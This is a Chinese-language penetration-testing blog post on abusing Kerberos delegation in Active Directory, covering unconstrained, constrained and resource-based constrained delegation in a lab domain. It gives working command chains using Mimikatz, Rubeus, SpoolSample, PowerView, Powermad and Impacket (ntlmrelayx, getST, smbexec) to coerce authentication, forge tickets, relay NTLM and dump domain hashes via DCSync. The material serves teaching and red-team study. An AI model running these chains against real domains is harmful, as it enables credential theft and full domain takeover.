---
title: Abusing Domain Delegation to Attack Active Directory
date: 2022-03-12 16:25:00 +0800
author: WHOAMI
toc: true
categories: ["Windows Security"]
tags: ["Kerberos", "Domain Delegation", "Privilege Escalation", "Active Directory"]
layout: post
---

域委派是指将域内用户的权限委派给服务账户，使得相关服务账户能够以域用户的身份权限获得相关域内服务资源的访问权限。值得注意的是，在域环境中，只有机器账户和服务账户拥有委派属性，也就是说只有这两类账户可以配置域委派。



在以下场景中，一个普通域用户 Marcus 通过 Kerberos 协议认证到前台 Web 服务，并请求下载文件。但是由于文件存储在后台文件服务器（File Server）上，因此 Web 服务器的服务账号 WebSvc 将模拟域用户 Marcus，并以 Kerberos 协议继续认证到后台文件服务器。后台文件服务器将文件返回给前台的 Web 服务器，Web 服务器再将文件返回给域用户 Marcus。这就是域委派的一般过程。

![](/assets/posts/2022-03-12-domain-delegation-attack/YZ5Qw1cPoqFCNpJ.png)

域委派是大型网络中经常部署的应用模式，给多跳认证带来很大的便利，同时也带来很大的安全隐患，利用委派可获取域管理员权限，甚至制作深度隐藏的后门。

到目前为止，有三种类型的域委派，分别是非约束性委派（Unconstrained Delegation）、约束性委派（Constrained Delegation）和基于资源的约束性委派（Resource-Based Constrained Delegation，RBCD）。下面我针对三类委派的请求机制以及利用攻击方法进行讲解。

## Unconstrained Delegation

在非约束性委派（Unconstrained Delegation）中，服务账号可以获取域用户的 TGT，并使用该 TGT 模拟域用户访问任意服务。配置了非约束性委派的账户的 `userAccountControl` 属性会设置 `TRUSTED_FOR_DELEGATION` 标志位。下图所示为非约束性委派的完整请求过程。

![](/assets/posts/2022-03-12-domain-delegation-attack/ZGSOItJ8XLEjR19.png)

上图描述了以下协议步骤：

> 1. 用户通过发送 KRB_AS_REQ 消息向密钥分发中心（KDC）进行身份验证，并请求一个可转发的 TGT（Forwardable TGT）。
> 2. KDC 在 KRB_AS_REP 消息中返回一个可转发的 TGT（Forwardable TGT）。
> 3. 用户基于步骤 2 中获得的可转发 TGT（Forwardable TGT）请求一个转发的 TGT（Forwarded TGT）。这是通过 KRB_TGS_REQ 消息完成的。
> 4. KDC 在 KRB_TGS_REP 消息中为用户返回一个转发的 TGT（Forwarded TGT）。
> 5. 用户使用步骤 2 中返回的 TGT（Forwardable TGT）请求一个 Service 1 的服务票证。这是通过 KRB_TGS_REQ 消息完成的。
> 6. 票证授予服务（TGS）在 KRB_TGS_REP 中返回 Service 1 的服务票证。
> 7. 用户通过发送 KRB_AP_REQ 消息请求 Service 1，并提供服务票证、转发的 TGT（Forwarded TGT）和转发 TGT 的会话密钥。
> 8. 为了满足用户的请求，Service 1 需要 Service 2 代表用户执行某些操作。Service 1 将用户提供的转发的 TGT （Forwarded TGT）放在 KRB_TGS_REQ 消息中发送给 KDC，要求为用户获取 Service 2 的服务票证。
> 9. KDC 在 KRB_TGS_REP 消息中返回一个 Service 2 的票证给 Service 1，并提供一个 Service 1 可以使用的会话密钥。该票证将客户标识为用户，而不是 Service 1。
> 10. Service 1 通过 KRB_AP_REQ，以用户的身份向 Service 2 发出请求。
> 11. Service 2 响应。
> 12. Service 1 可以使用该响应来回应用户在步骤 7 中的请求。
> 13. 如此描述的 TGT 转发委派机制不会限制 Service 1 对转发 TGT 的使用。Service 1 可以要求 KDC 以用户的名义获取任何其他服务的票证。
> 14. KDC 将返回请求的票证。
> 15. Service 1 然后可以继续以用户的身份冒充其他服务。这可能会带来风险，例如，如果 Service 1 被入侵，Service 1 可以继续冒充合法用户向其他服务请求。

从攻击的角度来看，当域管理员用户访问 Service 1 时，KDC 会检查 Service 1 服务账号的 `userAccountControl` 属性，发现 Service 1 服务配置了非约束性委派时，会进行上述认证过程。如果 Service 1 受到威胁，最终控制 Service 1 攻击者将获得域管理员用户的 TGT。 

### Discovery

首先，在域控制器上为域内主机 WIN10-CLIENT1 配置非约束性委派，如下图所示。

![](/assets/posts/2022-03-12-domain-delegation-attack/JgIVyFMCXhYK34o.png)

需要注意的是，只有拥有 SeEnableDelegationPrivilege 特权的用户才可以为其他主机账户或服务账户配置非约束性委派，而该特权默认情况下赋予管理员用户，如下图所示。

![](/assets/posts/2022-03-12-domain-delegation-attack/image-20220331183519791.png)

配置了非约束性委派的账户的 `userAccountControl` 属性会设置 `TRUSTED_FOR_DELEGATION` 标志位，可以在域内主机上通过 AdFind 进行查询，相关命令如下。

```console
# 查询域中配置非约束委派的机器账户
C:\Users\Marcus\Desktop> AdFind.exe -b "dc=pentest,dc=com" -f "(&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))" -dn
# 查询域中配置非约束委派的服务账户
C:\Users\Marcus\Desktop> AdFind.exe -b "dc=pentest,dc=com" -f "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))" -dn
```

![](/assets/posts/2022-03-12-domain-delegation-attack/Oi52mAwGhfYTyl3.png)

如上图所示，域内主机 DC01 和 WIN10-CLIENT1 配置了非约束性委派，其中 DC01 为域控制器，WIN10-CLIENT1 为刚才配置的普通域成员主机。假设此时攻击者获取了普通用户 Marcus 的权限，并以 Marcus 用户登录了 WIN10-CLIENT1，那么攻击者可以通过非约束性委派获取域管理员权限。

### Unconstrained Delegation Attack

我们通过以下环境来演示非约束性委派攻击的过程：

```
- 域：pentest.com
- 域控制器
  - 主机名：DC01
  - IP 地址：172.26.10.11
- 域成员主机
  - 主机名：WIN10-CLIENT1
  - IP 地址：172.26.10.21
- 域管理员用户：Administrator
- 普通用户：Marcus
```

（1）首先，通过 Marcus 用户登录域成员主机 WIN10-CLIENT1，并尝试访问域控制器的 CIFS 服务，结果失败。

![](/assets/posts/2022-03-12-domain-delegation-attack/image-20220331183734196.png)

（2)接着，当域管理员通过 WinRM 等方式远程连接 WIN10-CLIENT1 主机时，WIN10-CLIENT1 主机的内存中将保存域管理员用户 Administrator 的 TGT。我们可以通过 Mimikatz 导出进行查看，相关命令如下，导出来的票证如下图所示。

```console
C:\Users\Marcus\Desktop> mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" exit
```

![](/assets/posts/2022-03-12-domain-delegation-attack/image-20220331214823931.png)

（3）如上图所示，可以看到域管理员账户的高权限TGT票证 `[0;13a0f0]-2-0-60a10000-Administrator@krbtgt-PENTEST.COM.kirbi`，执行以下命令，通过 Mimikatz 传递该票证。

```console
C:\Users\Marcus\Desktop> mimikatz.exe "kerberos::ptt [0;13a0f0]-2-0-60a10000-Administrator@krbtgt-PENTEST.COM.kirbi" exit
```

![](/assets/posts/2022-03-12-domain-delegation-attack/kiJduKsGxT3OVFE.png)
（4)再次尝试访问 DC01 的 C$ 共享，如下图所示，访问成功。

![](/assets/posts/2022-03-12-domain-delegation-attack/image-20220331184355745.png)

### Coerce Authentication

前文中介绍了非约束性委派攻击的一般利用方法，但是该方法必须由域管理员远程连接后留下高权限的 TGT 才能利用，因此显得有些鸡肋。不过我们配合 PrinterBug 等工具执行强制身份认证（Coerce Authentication），非约束性委派攻击助力。

Windows 中的 MS-RPRN（Print System Remote Protocol，打印系统远程协议）用于打印客户端和打印服务器之间的通信，支持客户端和服务器之间的同步打印和联机操作，包括打印任务控制以及打印系统管理。

MS-RPRN协议中定义的 RpcRemoteFindFirstPrinterChangeNotification API 可以创建远程修改通知对象，用于监控对打印机对象的修改，并向打印客户端发送修改通知。任何具备域用户权限的攻击者都可以滥用该方法来强迫运行打印服务（Print Spooler）的主机向攻击者选择的目标主机发起 Kerberos 或 NTLM 认证请求。

结合 PrinterBug，攻击者可以强制域控制器向配置了非约束性委派的主机发起 Kerberos 身份认证，并获取域控的高权限 TGT，该利用场景是 [@tifkin_](https://twitter.com/tifkin_)、[@enigma0x3](http://twitter.com/enigma0x3) 和 [@harmj0y](https://twitter.com/harmj0y) 在 2018 年的 DerbyCon 大会上提出的，并开发了一个概念性的工具 [SpoolSample](https://github.com/leechristensen/SpoolSample)。详情可以参考以下链接中的文章和视频：

- https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1
- https://www.slideshare.net/harmj0y/derbycon-the-unintended-risks-of-trusting-active-directory

![](/assets/posts/2022-03-12-domain-delegation-attack/0_vqiYvTtZylwXe5zH.png)
下面我将对 PrinterBug 和非约束性委派结合的利用方法进行演示，相关利用工具如下。

（1）首先，通过 Marcus 用户登录域成员主机 WIN10-CLIENT1，尝试通过 DCSync 导出域内用户哈希，结果失败。

```console
C:\Users\Marcus\Desktop> mimikatz.exe "lsadump::dcsync /domain:pentest.com /user:PENTEST\Administrator" exit
```

![](/assets/posts/2022-03-12-domain-delegation-attack/ovGxJcZshtCTHVn.png)

（2）在 WIN10-CLIENT1 主机上通过本地管理员启动 [Rubeus](https://github.com/GhostPack/Rubeus) 监听，相关命令如下。

```console
C:\Users\Marcus\Desktop> Rubeus.exe monitor /interval:5 /filteruser:DC01$

# /interval:5 设置监听间隔5秒
# /filteruser 设置监听对象为我们的域控，注意后面有个$，如果不设置监听对象就监听所有的 TGT
```

![](/assets/posts/2022-03-12-domain-delegation-attack/image-20220331184847841.png)

（3）在 WIN10-CLIENT1 主机上执行 SpoolSample，强制域控制器 DC01 向 WIN10-CLIENT1 发起 Kerberos 认证，相关命令如下。值得注意的是，这里必须使用主机名（或者 DNS 名称）而不是 IP 地址。

```console
C:\Users\Marcus\Desktop> SpoolSample.exe DC01 WIN10-CLIENT1
```

![](/assets/posts/2022-03-12-domain-delegation-attack/image-20220331185024374.png)

（4）如下图所示，执行 SpoolSample 后，Rubeus 成功监听并截取到域控机器的 TGT（Base64编码后的）。

![](/assets/posts/2022-03-12-domain-delegation-attack/cux2kU4gthjXOiz.png)

直接使用 Rubeus 传递该 Base64 编码后的票证：

```console
C:\Users\Marcus\Desktop> Rubeus.exe ptt /ticket:<Base64EncodedTicket>
```

![](/assets/posts/2022-03-12-domain-delegation-attack/image-20220331185243424.png)

（5)由于域控机器账户是默认拥有 DCSync 权限的，因此可以成功导出域内用户哈希，如下图所示。

![](/assets/posts/2022-03-12-domain-delegation-attack/image-20220331185509123.png)
## Constrained Delegation

因为非约束委派的不安全性，约束委派（Constrained Delegation）应运而生。在 Widnows Server 2003 之后微软引入了非约束委派。同时，为了顺利进行约束性委派，微软为 Kerberos 协议的 TGS_REQ 和 TGS_REP 阶段引入了两个扩展协议 S4u2self（Service for User to Self）和 S4U2proxy（Service for User to Proxy）。

S4U2self 扩展允许服务代表用户获取针对自己的服务票证，S4U2proxy 允许服务代表用户获取另一个服务的服务票证。约束委派就是限制了 S4U2proxy 扩展的请求范围，使得配置了委派属性的服务只能模拟用户身份访问特定的其他服务。配置了约束性委派的账户的 `userAccountControl` 属性会设置 `TRUSTED_TO_AUTH_FOR_DELEGATION` 标志位，并且账户的 `msDS-AllowedToDelegateTo` 属性会被设置为对哪些服务进行委派。下图所示为约束性委派中，S4U2self 和 S4U2proxy 扩展的完整请求过程。

![](/assets/posts/2022-03-12-domain-delegation-attack/q1dGC3syUAfR29w.png)

上图描述了以下协议步骤：

> 1. 用户的机器向 Service 1 发出请求。用户已通过身份验证，但 Service 1 没有用户的授权数据。通常这是因为身份验证是通过 Kerberos 以外的其他方式进行的。
> 2. Service 1 已经通过 KDC 进行身份验证并获得其 TGT，并使用 S4U2self 扩展代表指定用户请求一个到自身的服务票证。用户通过 S4U2self 数据中的用户名和用户的领域名称进行标识。或者，如果 Service 1 拥有用户的证书，它可以使用 PA-S4U-X509-USER 结构通过证书向 KDC 标识用户。
> 3. KDC 返回一个地址为 Service 1 的服务票证，就像它是由用户使用自己的 TGT 请求的一样。服务票证可能包含用户的授权数据。
> 4. Service 1 可以使用服务票证中的授权数据来满足用户的请求，然后响应用户。虽然 S4U2self 为 Service 1 提供了关于用户的信息，但该扩展不允许 Service 1 代表用户向其他服务发出请求，那是 S4U2proxy 的作用。S4U2proxy 在上图中的下半部分中描述。
> 5. 用户的机器向 Service 1 发出请求。Service 1 需要以用户的身份访问 Service 2 上的资源。然而，Service 1 没有用户提供的转发的 TGT（Forwarded TGT）来执行转发 TGT 的委派，如前一节中描述 Kerberos 转发 TGT 进行委派的图所示。此步骤有两个前提条件。首先，Service 1 已经通过 KDC 进行身份验证并拥有有效的 TGT。其次，Service 1 拥有一个从用户到 Service 1 的可转发的服务票证（Forwardable TGS）。该可转发的服务票证（Forwardable TGS）可能是通过 KRB_AP_REQ 消息获得的，或通过 S4U2self 请求获得的。
> 6. Service 1 代表指定用户请求一个到 Service 2 的服务票证。用户通过 Service 1 的服务票证中的客户名和客户领域进行标识。要返回的票证中的授权数据也从 Service 1 的服务票证中复制。
> 7. 如果请求中有权限属性证书（PAC），则 KDC 通过检查 PAC 结构的签名数据来验证 PAC。如果 PAC 有效或不存在，则 KDC 返回一个 Service 2 的服务票证，但服务票证中的 cname 和 crealm 字段存储的是用户的身份，而不是 Service 1 的。
> 8. Service 1 使用服务票证向 Service 2 发出请求。Service 2 将此请求视为来自用户，并假设用户已通过 KDC 认证。
> 9. Service 2 对请求作出响应。
> 10. Service 1 对用户在消息 5 中的请求作出响应。

从攻击的角度来看，如果 Service 1 受到威胁，由于 Service 1 配置了到 Service 2 的约束性委派，则攻击者可以利用 Service 1 代表域管理员用户访问 Service 2。如果 Service 2 位于域控制器，例如域控的 CIFS、LDAP 等服务，那么就可以直接获取域控制器权限。

值得注意的是，由于非约束性委派的整个过程中，Service 1 无法获取用户的 TGT，因此需要通过构造 S4U 请求，以任意用户的权限申请访问某服务的 ST。但是在申请 ST 之前，机器账户或服务账户必须先申请到自己的 TGT，这就意味着需要获取机器账户或服务账户的哈希值或明文密码。

### Discovery

首先，在域控制器上为域内主机 WIN10-CLIENT1 配置约束性委派，配置其对域控制器 DC01 的 LDAP 服务进行委派，如下图所示。需要注意的是，只有拥有 SeEnableDelegationPrivilege 特权的用户才可以为其他主机账户或服务账户配置非约束性委派，而该特权默认情况下赋予管理员用户。

![](/assets/posts/2022-03-12-domain-delegation-attack/56Pmh8fnabJdRsA.png)

配置了约束性委派的账户的 `userAccountControl` 属性会设置 `TRUSTED_TO_AUTH_FOR_DELEGATION` 标志位，并且账户的 `msDS-AllowedToDelegateTo` 属性会被设置为对哪些服务进行委派。可以在域内主机上通过 AdFind 进行查询，相关命令如下。

```console
# 查询域中配置约束委派的机器账户
C:\Users\Marcus\Desktop> AdFind.exe -b "dc=pentest,dc=com" -f "(&(samAccountType=805306369)(msds-allowedtodelegateto=*))" msds-allowedtodelegateto
# 查询域中配置约束委派的服务账户
C:\Users\Marcus\Desktop> AdFind.exe -b "dc=pentest,dc=com" -f "(&(samAccountType=805306368)(msds-allowedtodelegateto=*))" msds-allowedtodelegateto
```

![](/assets/posts/2022-03-12-domain-delegation-attack/Xw2Qlq94bOYByKA.png)

从查询结果中可以看到，此时域成员主机 WIN10-CLIENT1 配置了约束性委派，并对域控制器 DC01 的 LDAP 服务进行委派。假设此时攻击者获取了普通用户 Marcus 的权限，并以 Marcus 用户登录了 WIN10-CLIENT1，那么攻击者可以通过约束性委派获取域控制器权限。

### Constrained Delegation Attack

我们通过以下环境来演示约束委派攻击的过程：

```
- 域：pentest.com
- 域控制器
  - 主机名：DC01
  - IP 地址：172.26.10.11
- 域成员主机
  - 主机名：WIN10-CLIENT1
  - IP 地址：172.26.10.21
- 域管理员用户：Administrator
- 普通用户：Marcus
```

（1）首先，通过 Marcus 用户登录域成员主机 WIN10-CLIENT1，尝试通过 DCSync 导出域内用户哈希，结果失败。

（2）然后，通过 Rubeus 申请机器账户 WIN10-CLIENT1 的 TGT，相关命令如下。执行后，将得到 Base64 加密后的 TGT 票证，如下图所示。

```console
C:\Users\Marcus\Desktop> Rubeus.exe asktgt /user:WIN10-CLIENT1$ /rc4:5dd934ddeff076dd686656a2a7d6081b /domain:pentest.com /dc:DC01.pentest.com /nowrap

# /user 指定要申请TGT的账户名
# /rc4 指定机器账户WIN10-CLIENT1$的哈希值
# /domain 指定域名
# /dc 指定域控制器
```

![](/assets/posts/2022-03-12-domain-delegation-attack/image-20220331220531127.png)

（3)然后执行以下命令，使用 S4U2Self 扩展代表域管理员 Administrator 请求针对域控 LDAP 服务的票证，并将得到的票证传递到内存中，执行结果如下图所示。

```console
C:\Users\Marcus\Desktop> Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:LDAP/DC01.pentest.com /dc:DC01.pentest.com /ptt /ticket:<Base64EncodedTicket>
# Rubeus.exe s4u /impersonateuser:PENTEST\Administrator /altservice:LDAP/DC01.pentest.com /dc:DC01.pentest.com /ptt /ticket:<Base64EncodedTicket>
```

![](/assets/posts/2022-03-12-domain-delegation-attack/fBrHLyAg4WKncMx.png)

![](/assets/posts/2022-03-12-domain-delegation-attack/image-20220331220707910.png)

（4）再次尝试 DCSync 操作，此时可以成功导出域内用户哈希，如下图所示。

![](/assets/posts/2022-03-12-domain-delegation-attack/image-20220331190001021.png)
## Resource-Based Constrained Delegation

基于资源的约束委派（Resource-Based Constrained Delegation，RBCD）是在 Windows Server 2012 中新引入的功能，与传统的约束委派相比，它不再需要拥有 SeEnableDelegationPrivilege 特权的域管理员去设置相关属性，并且将设置委派的权限交换给了服务资源自身，即服务自己可以决定谁可以对我进行委派。

可以将基于资源的约束性委派理解为传统的约束性委派的反向过程。以 Service 1 和 Service 2 两个服务为例，传统的约束性委派需要在 Service 1 上设置 msDS-AllowedToDelegateTo 属性，以指定对 Service 2 上的哪一个服务进行委派。二在基于资源的约束性委派中，需要在 Service 2 上将 msDS-AllowedToActOnBehalfOfOtherIdentity 属性值设为 Service 1 的 SID，以允许 Service 1 对 Service 2 上的服务进行委派。

此外，在传统的约束性委派中，通过 S4u2self 申请到的 ST 票证一定是可转发的，如果不可转发，则后续的 S4U2Proxy 阶段将失败。但是在基于资源的约束性委派中，不可转发的 ST 票证仍然可以通过 S4U2Proxy 阶段对其他服务进行委派认证。因此，基于资源的约束性委派与传统的约束性委派在利用方法上大同小异。

### RBCD Attack

基于资源的约束性委派的关键在于 msDS-AllowedToActOnBehalfOfOtherIdentity 属性的设置，虽然基于资源的约束性委派的配置并不需要管理员权限，但是要向修改服务账户或机器账户的 msDS-AllowedToActOnBehalfOfOtherIdentity 属性，用户必须拥有对其完全控制（GenericAll），或拥有 GenericWrite、WriteProperty、WriteDacl 等权限。

下面我对基于资源的约束性委派的一般攻击过程进行演示，测试环境如下，并假设已经获取到了 Marcus 用户的权限，并以 Marcus 用户登录了 WIN10-CLIENT1。

- 域：pentest.com
- 域控制器
  - 主机名：DC01
  - IP 地址：172.26.10.11
- 域成员主机
  - 主机名：WIN10-CLIENT1
  - IP 地址：172.26.10.21
- 域管理员用户：Administrator
- 普通用户：Marcus

（1）使用 [PowerView.ps1](https://github.com/shigophilo/tools/blob/master/PowerView.ps1) 可以枚举指定用户 Marcus 对机器账户 DC01 的 ACE，发现该用户对 DC01 完全控制，如下图所示。

```powershell
# 导入模块
Import-Module .\PowerView.ps1
# 获取 Marcus 用户的 SID
Get-DomainUser -Identity Marcus -Properties objectsid
# 枚举 Marcus 用户对 DC01 的 ACE
Get-DomainObjectAcl -Identity DC01 | ?{$_.SecurityIdentifier -match "S-1-5-21-1536491439-3234161155-253608391-1106"}
```

![](/assets/posts/2022-03-12-domain-delegation-attack/ixNPClrDA6EM7tB.png)

（2）Marcus 用户对 DC01 完全控制，因此可以通过 Marcus 用户的权限修改并设置机器账户 DC01 的 msDS-AllowedToActOnBehalfOfOtherIdentity 属性。但此时还需要一个具有 SPN 的账户，以允许该账户对 DC01 上的服务进行委派。在域内，如果拥有一个普通的域用户，那么我们就可以利用这个用户创建新的机器帐户，并且默认最多允许创建 10 个机器账户，这是由域属性 `MachineAccountQuota` 决定的。

以 Marcus 用户用户权限执行 [Powermad.ps1](https://github.com/Kevin-Robertson/Powermad)，创建一个名为 PENTEST$，密码为 Passw0rd 的机器账户，相关命令如下。新建的机器账户将默认注册 `RestrictedKrbHost/domain` 和 `HOST/domain` 这两个 SPN。

```powershell
# 导入模块
Import-Module .\Powermad.ps1
# 设置机器账户的密码
$Password = ConvertTo-SecureString 'Passw0rd' -AsPlainText -Force
# 通过 New-MachineAccount 函数创建机器账户
New-MachineAccount -MachineAccount "PENTEST" -Password $($Password) -Domain "pentest.com" -DomainController "DC01.pentest.com" -Verbose
```

![](/assets/posts/2022-03-12-domain-delegation-attack/RCsrS6cwDjqmEvz.png)

（3）接下来，我们通过 PowerView.ps1 配置 PENTEST 到 DC01 的基于资源的约束性委派，相关命令如下。

```powershell
# 导入模块
Import-Module .\PowerView.ps1
# 获取 PENTEST 账户的 SID
Get-NetComputer "PENTEST" -Properties objectsid
# 配置 PENTEST 到 DC01 的基于资源的约束性委派
$A = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1536491439-3234161155-253608391-1109)"
$SDBytes = New-Object byte[] ($A.BinaryLength)
$A.GetBinaryForm($SDBytes, 0)
Get-DomainComputer DC01 | Set-DomainObject -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=$SDBytes} -Verbose
# 查看是否配置成功
Get-DomainComputer DC01 -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
```

![](/assets/posts/2022-03-12-domain-delegation-attack/RnwZXNUph4t8O67.png)

若想清除 msDS-AllowedToActOnBehalfOfOtherIdentity 属性的值，可以执行以下命令：

```powershell
Set-DomainObject DC01 -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity' -Verbose
```

（4）接下来就是传统约束性委派攻击的流程了。通过 Rubeus 申请机器账户 WIN10-CLIENT1 的 TGT，相关命令如下。执行后，将得到 Base64 加密后的 TGT 票证，如下图所示。

```console
C:\Users\Marcus\Desktop> Rubeus.exe asktgt /user:PENTEST$ /password:Passw0rd /domain:pentest.com /dc:DC01.pentest.com /nowrap

# /user 指定要申请 TGT 的账户名
# /password 指定机器账户 PENTEST$ 的哈希值密码
# /domain 指定域名
# /dc 指定域控制器
```

![](/assets/posts/2022-03-12-domain-delegation-attack/image-20220331220856516.png)

（5）然后执行以下命令，使用 S4U2Self 扩展代表域管理员 Administrator 请求针对域控 LDAP 服务的票证，并将得到的票证传递到内存中，执行结果如下图所示。

```console
C:\Users\Marcus\Desktop> Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:LDAP/DC01.pentest.com /dc:DC01.pentest.com /ptt /ticket:<Base64EncodedTicket>
```

![](/assets/posts/2022-03-12-domain-delegation-attack/UQ7epNm1h8nzDVE.png)
![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/iMS6EJnGm3HZAew.png)

（6）此时执行 DCSync，可以成功导出域内用户哈希，如下图所示。

![](/assets/posts/2022-03-12-domain-delegation-attack/image-20220331190944631.png)
### NTLM Relay + RBCD

前面我们介绍了基于资源的约束性委派的一般利用过程，一个很关键的条件就是当前所控的用户必须对 Service 2 拥有 GenericAll、GenericWrite、WriteProperty 或 WriteDacl 等权限，否则将无法修改并设置其 `msDS-AllowedToActOnBehalfOfOtherIdentity` 属性。然而，在 NTLM Relay 中，通过 Relay To LDAP 可以直接修改活动目录中的属性值，如果我们控制一个机器账户通过 NTLM Relay 认证到 LDAP，毫无疑问该机器账户能够直接修改并设置自己的 `msDS-AllowedToActOnBehalfOfOtherIdentity` 属性。

下面我对 NTLM Relay 结合 RBCD 的攻击过程进行演示，测试环境如下，并假设已经获取到了 Marcus 用户的凭据。

- 域：pentest.com
- 域控制器
  - 主机名：DC01
  - IP 地址：172.26.10.11
- 域内服务器
  - 主机名：WIN2016-WEB1
  - IP 地址：172.26.10.13
- 域管理员用户：Administrator
- 普通用户：Marcus
- Kali Linux 
  - IP 地址：172.26.10.134

（1）首先，通过 [Impacket](https://github.com/SecureAuthCorp/impacket) 套件中的 addcomputer.py 工具，以普通域用户 Marcus 的身份在域中添加一个名为 PENTEST$ 的机器账户，密码为 Passw0rd，相关命令如下，执行结果如下图所示。

```bash
python3 addcomputer.py pentest.com/Marcus:Marcus\@123 -computer-name PENTEST\$ -computer-pass Passw0rd -dc-ip 172.26.10.11

# -computer-name 指定要创建的机器账户名
# -computer-pass 指定要创建的机器账户密码
```

![](/assets/posts/2022-03-12-domain-delegation-attack/jPNMZJx4pKHzU7f.png)

（2)执行以下命令，在 Kali Linux 上启动 ntlmrelayx.py 监听，如图下所示。

```bash
python3 ntlmrelayx.py -t ldap://172.26.10.11 --remove-mic --delegate-access --escalate-user PENTEST\$ -smb2support
```

![](/assets/posts/2022-03-12-domain-delegation-attack/image-20220331191056561.png)

（3）然后通过 Python 版本的 [Printerbug](https://github.com/dirkjanm/krbrelayx) 迫使 WIN2016-WEB1 主机向 Kali Linux 发起 NTLM 认证请求，相关命令如下。

```bash
python3 printerbug.py pentest.com/Marcus:Marcus\@123@172.26.10.13 172.26.10.134
```

![](/assets/posts/2022-03-12-domain-delegation-attack/rSHPsu8IinDGMNc.png)

此时，ntlmrelayx.py 将截获 WIN2016-WEB1 机器账户的 Net-NTLM Hash，并将其 Relay 到域控的 LDAP 服务，如图下所示。

![](/assets/posts/2022-03-12-domain-delegation-attack/r8G7sHd61cSCQWT.png)

（4）接着，通过 Impacket 套件中的 getST.py 执行基于资源的约束性委派攻击，并获取用于访问 WIN2016-WEB1 机器上 CIFS 服务的高权限票证，如图下所示。

```bash
python3 getST.py pentest.com/PENTEST\$:Passw0rd -spn CIFS/WIN2016-WEB1.pentest.com -impersonate Administrator -dc-ip 172.26.10.11

# -spn 指定创建的票证要认证到的服务 SPN  
# -impersonate 指定要通过 S4U 代表的用户  
# -dc-ip 指定域控制器的 IP 地址  
```

![](/assets/posts/2022-03-12-domain-delegation-attack/OULbGYMhfg1eiVy.png)

（5）最后，通过设置环境变量 `KRB5CCNAME` 来使用该票证，并通过 smbexec.py 获取 WIN2016-WEB1 机器的最高权限，相关命令如下，执行结果如下图所示。在执行以下命令之前，需要将 Kali Linux 的 /etc/resolv.conf 中 DNS 服务器改为域控制器的 IP 地址。

```bash
export KRB5CCNAME=Administrator.ccache
python3 smbexec.py -target-ip 172.26.10.13 -k WIN2016-WEB1.pentest.com -no-pass   

# -k 指定通过 Kerberos 协议执行身份验证，这将在环境变量 KRB5CCNAME 指定的 ccache 文件中获取凭据 
# -no-pass 指定不需要提供密码，与 -k 选项配合使用
```

![](/assets/posts/2022-03-12-domain-delegation-attack/5X3UGQMcLBgNsHY.png)
## Ending......

参考文献：

> https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/1fb9caca-449f-4183-8f7a-1a5fc7e7290a
>
> https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/02636893-7a1f-4357-af9a-b672e3e3de13
>
> https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/bde93b0e-f3c9-4ddf-9f44-e1453be7af5a
>
> https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html
>
> https://pentestlab.blog/2022/03/21/unconstrained-delegation/

